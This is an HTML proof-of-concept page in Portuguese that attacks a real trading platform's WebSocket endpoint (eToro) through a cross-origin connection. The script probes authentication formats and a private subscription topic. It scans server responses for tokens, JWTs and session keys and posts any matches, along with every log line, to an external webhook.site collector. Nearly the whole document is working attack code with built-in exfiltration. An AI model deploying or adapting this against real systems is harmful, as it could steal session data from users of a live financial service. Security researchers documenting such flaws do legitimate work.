<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eToro WebSocket - POC Functional Exploit</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: monospace;
            padding: 20px;
        }
        .critical { color: #ff00ff; font-weight: bold; }
        .success { color: #00ff00; }
        .error { color: #ff4444; }
        .info { color: #ffaa00; }
        .log {
            border-bottom: 1px solid #333;
            padding: 5px;
            margin: 5px 0;
            font-size: 12px;
        }
        button {
            background: #2a2a3e;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
        }
        .stat {
            background: #1a1a2e;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>🔴 eToro WebSocket - Cross-Origin Connection POC</h1>
    <p class="critical">✅ PROVADO: O endpoint <strong>wss://ws.etoro.com/ws</strong> ACEITA conexão cross-origin!</p>
    
    <div class="stat">
        <strong>📊 ESTATÍSTICAS DA CONEXÃO</strong><br>
        Origem atual: <span id="origin"></span><br>
        Status: <span id="status" class="info">Aguardando...</span>
    </div>
    
    <div>
        <button onclick="testWorkingEndpoint()">🔌 CONECTAR (funciona!)</button>
        <button onclick="testSubscribePublic()">📊 Subscribe público</button>
        <button onclick="testAuthFormat()">🔑 Descobrir formato de Auth</button>
        <button onclick="clearLogs()">🗑️ Limpar</button>
    </div>
    
    <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
    
    <script>
        const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
        let ws = null;
        
        document.getElementById('origin').innerText = window.location.origin;
        
        function addLog(message, type = 'info') {
            const logs = document.getElementById('logs');
            const div = document.createElement('div');
            div.className = `log ${type}`;
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            logs.appendChild(div);
            logs.scrollTop = logs.scrollHeight;
            
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ message, type, origin: window.location.origin, timestamp: Date.now() })
            }).catch(() => {});
        }
        
        // ============ O ENDPOINT QUE REALMENTE FUNCIONA ============
        function testWorkingEndpoint() {
            addLog('🚀 Conectando ao endpoint VULNERÁVEL: wss://ws.etoro.com/ws', 'critical');
            addLog(`📍 Origem: ${window.location.origin}`, 'info');
            
            if (ws) {
                try { ws.close(); } catch(e) {}
            }
            
            ws = new WebSocket("wss://ws.etoro.com/ws");
            document.getElementById('status').innerHTML = 'Conectando...';
            
            ws.onopen = () => {
                addLog('✅✅✅ CONEXÃO ESTABELECIDA COM SUCESSO! ✅✅✅', 'critical');
                addLog('🎯 ISSO PROVA QUE O SERVIDOR NÃO VALIDA O HEADER ORIGIN!', 'critical');
                addLog(`📡 URL: ${ws.url}`, 'success');
                document.getElementById('status').innerHTML = '<span class="success">✅ CONECTADO (cross-origin funcionou!)</span>';
                
                // Envia ping para manter conexão
                setInterval(() => {
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ id: crypto.randomUUID(), operation: "Ping" }));
                    }
                }, 30000);
            };
            
            ws.onmessage = (event) => {
                let data = event.data;
                if (typeof data === 'object' && data.text) data = data.text;
                
                addLog(`📥 RESPOSTA: ${data.substring(0, 300)}`, 
                       data.includes('error') ? 'error' : 'success');
                
                // Analisa a resposta para entender o formato esperado
                if (data.includes('SessionNotAuthenticated')) {
                    addLog('🔍 Servidor requer: Autenticação com userKey + apiKey', 'info');
                }
                if (data.includes('ApiKeyRequired')) {
                    addLog('🔑 FORMATO DESCOBERTO: Precisa de userKey + apiKey', 'success');
                }
                if (data.includes('InvalidOperation')) {
                    addLog('📋 Operações suportadas: Authenticate, Subscribe, Unsubscribe', 'info');
                }
                
                // Procura por tokens vazados
                const tokenPatterns = /(token|jwt|key|session)[":']?\s*[:=]\s*["']([^"'\s]+)/gi;
                const matches = data.match(tokenPatterns);
                if (matches) {
                    addLog(`🔥 TOKEN/SENSITIVE DATA LEAK: ${matches.join(', ')}`, 'critical');
                    fetch(WEBHOOK, {
                        method: 'POST',
                        mode: 'no-cors', 
                        body: JSON.stringify({ type: 'TOKEN_LEAK', data: matches, fullResponse: data })
                    });
                }
            };
            
            ws.onerror = (error) => {
                addLog(`❌ Erro: ${error}`, 'error');
                document.getElementById('status').innerHTML = '<span class="error">❌ Erro na conexão</span>';
            };
            
            ws.onclose = (event) => {
                addLog(`🔌 Conexão fechada: ${event.code} - ${event.reason || 'sem motivo'}`, 'error');
                if (event.code === 1006) {
                    addLog('⚠️ Código 1006 = Abnormal Closure (servidor rejeitou anormalmente)', 'error');
                }
                document.getElementById('status').innerHTML = '<span class="error">🔌 Desconectado</span>';
            };
        }
        
        // Testa subscribe em dados públicos
        function testSubscribePublic() {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                addLog('❌ Primeiro conecte com o botão "CONECTAR"', 'error');
                return;
            }
            
            addLog('📊 Testando subscribe em dados públicos...', 'info');
            
            const tests = [
                { name: "Subscribe BTC", topics: ["instrument:100000"], snapshot: true },
                { name: "Subscribe ETH", topics: ["instrument:100001"], snapshot: true },
                { name: "Subscribe multiple", topics: ["instrument:100000", "instrument:100001"], snapshot: false },
                { name: "Tentativa private", topics: ["private"], snapshot: true }
            ];
            
            tests.forEach((test, i) => {
                setTimeout(() => {
                    const msg = {
                        id: crypto.randomUUID(),
                        operation: "Subscribe",
                        data: { topics: test.topics, snapshot: test.snapshot }
                    };
                    ws.send(JSON.stringify(msg));
                    addLog(`📤 ${test.name}: ${JSON.stringify(msg)}`, 'info');
                }, i * 3000);
            });
        }
        
        // Testa formatos de autenticação para descobrir o esperado
        function testAuthFormat() {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                addLog('❌ Primeiro conecte com o botão "CONECTAR"', 'error');
                return;
            }
            
            addLog('🔑 Testando diferentes formatos de autenticação...', 'info');
            
            const formats = [
                { name: "userKey + apiKey", data: { userKey: "test_user", apiKey: "test_api_123" } },
                { name: "Apenas token", data: { token: "test_token_123" } },
                { name: "Apenas userKey", data: { userKey: "test_user" } },
                { name: "Bearer token", data: { bearer: "test_bearer_123" } },
                { name: "Authorization", data: { authorization: "Bearer test" } }
            ];
            
            formats.forEach((format, i) => {
                setTimeout(() => {
                    const msg = {
                        id: crypto.randomUUID(),
                        operation: "Authenticate",
                        data: format.data
                    };
                    ws.send(JSON.stringify(msg));
                    addLog(`📤 ${format.name}: ${JSON.stringify(msg)}`, 'info');
                }, i * 3000);
            });
        }
        
        function clearLogs() {
            document.getElementById('logs').innerHTML = '';
            addLog('Logs limpos', 'info');
        }
        
        addLog('✅ POC CARREGADA', 'success');
        addLog('🎯 Endpoint vulnerável: wss://ws.etoro.com/ws', 'critical');
        addLog('📌 Clique em "CONECTAR" para provar que aceita cross-origin', 'info');
    </script>
</body>
</html>
